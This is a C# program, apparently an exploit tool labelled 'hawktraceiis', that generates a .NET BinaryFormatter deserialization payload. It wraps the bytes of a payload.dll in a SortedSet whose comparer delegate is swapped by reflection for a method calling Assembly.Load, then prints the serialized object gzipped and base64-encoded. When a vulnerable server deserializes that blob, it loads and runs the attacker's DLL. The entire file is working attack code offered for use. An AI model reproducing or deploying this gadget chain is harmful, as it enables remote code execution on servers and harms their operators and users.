using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;

namespace hawktraceiis
{
    class Program
    {
        static int CompareArrays(Array a, Array b)
        {
            return a.Length.CompareTo(b.Length);
        }

        static int LoadAssembly(Array a, Array b)
        {
            if (a is byte[] bytes)
            {
                Assembly.Load(bytes);
            }
            return 0;
        }

        static void Main(string[] args)
        {
            byte[] ASSEMBLY_BYTES = File.ReadAllBytes(@"payload.dll");
            Delegate da = new Comparison<Array>(CompareArrays);
            Comparison<Array> d = (Comparison<Array>)MulticastDelegate.Combine(da, da);
            IComparer<Array> comp = Comparer<Array>.Create(d);
            SortedSet<Array> set = new SortedSet<Array>(comp);
            set.Add(ASSEMBLY_BYTES);
            set.Add("dummy".ToCharArray());
            
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = new Comparison<Array>(LoadAssembly);
            fi.SetValue(d, invoke_list);
            
            using (MemoryStream stream = new MemoryStream())
            {
                BinaryFormatter formatter = new BinaryFormatter();
                formatter.Serialize(stream, set);
                using (MemoryStream compst = new MemoryStream())
                {
                    using (GZipStream gzipStream = new GZipStream(compst, CompressionMode.Compress))
                    {
                        stream.Position = 0;
                        stream.CopyTo(gzipStream);
                    }
                    string gzb4 = Convert.ToBase64String(compst.ToArray());
                    Console.WriteLine(gzb4);
                }
            }
        }
    }
}
